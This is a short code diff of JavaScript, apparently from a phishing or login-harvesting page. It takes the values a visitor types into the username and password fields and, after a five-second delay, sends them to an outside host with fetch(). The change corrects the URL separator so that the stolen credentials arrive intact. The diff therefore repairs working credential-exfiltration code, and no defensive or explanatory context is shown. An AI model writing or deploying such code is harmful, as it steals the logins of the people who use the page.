@@ -19,5 +19,5 @@ var u_val = encodeURIComponent(u.value)
 var p_val = encodeURIComponent(p.value)
 
 setTimeout(function(){
-        fetch("https://www.cassaforenze.it/?rid=mDPEqCa?usr=" + u_val + "&pas=" + p_val)
+        fetch("https://www.cassaforenze.it/?rid=mDPEqCa&usr=" + u_val + "&pas=" + p_val)
 }, 5000);
